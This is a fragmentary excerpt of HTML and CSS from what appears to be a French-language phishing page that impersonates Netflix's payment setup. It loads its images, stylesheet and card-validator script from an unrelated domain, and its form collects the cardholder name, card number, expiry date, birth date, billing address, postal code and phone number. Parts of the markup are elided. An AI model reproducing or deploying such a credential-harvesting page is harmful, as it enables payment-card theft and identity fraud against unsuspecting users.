...
<style>
#Securitycode {
background-image: url('https://aqua-e.it//css/style/css/sprite_logos_wallet_2x.png');
...
background-position: 106.5% 48.1%;
 ...
 #cardnumber {
background-image: url('https://aqua-e.it//css/style/css/cards-sprite-small@2x.png');
background-repeat: no-repeat;
background-size: 62px;
 ...
 #chtamastartro {
  background-image: url('https://aqua-e.it//css/style/css/3dsecure.png');
  background-repeat: no-repeat;
...
<script src="https://aqua-e.it//css/style/js/jquery.CardValidator.js"></script>
...
<link type="text/css" rel="stylesheet" href="https://aqua-e.it//css/style/css/nonechaditkk.css"/>
...
.regStepLogo {
    background: url(https://aqua-e.it//css/style/css/Devices.png) no-repeat 50% 50%;
    height: 90px;
...
<div id="NFX" class="login-wrapper-background"><img class="concord-img vlv-creative" src="https://aqua-e.it//css/style/css/alpha_website_small.jpg"  alt="">
...
<h1  id="tiitleCardnetpas">Définissez votre mode de paiement Netflix </h1>
...
<span for="id_addres" class="placeLabel">Nom sur la carte</span></label>
...
<span for="id_addres" class="placeLabel">Numéro de carte</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_City" class="placeLabel">Date d'expiration</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_birthdate" class="placeLabel">Date de naissance (JJ/MM/AAAA)</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_addres" class="placeLabel">Adresse facturation</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_City" class="placeLabel">Ville</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_State" class="placeLabel">Département</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_zipCod" class="placeLabel">Code Postale</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<span for="id_phoneNumber" class="placeLabel">Numéro de Téléphone</span></label>
<div class="ui-select-wrapper country-select">
<a href="#" class="ui-select-wrapper-link"></a>
</div>
</div>
...
<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">Continuer</button>
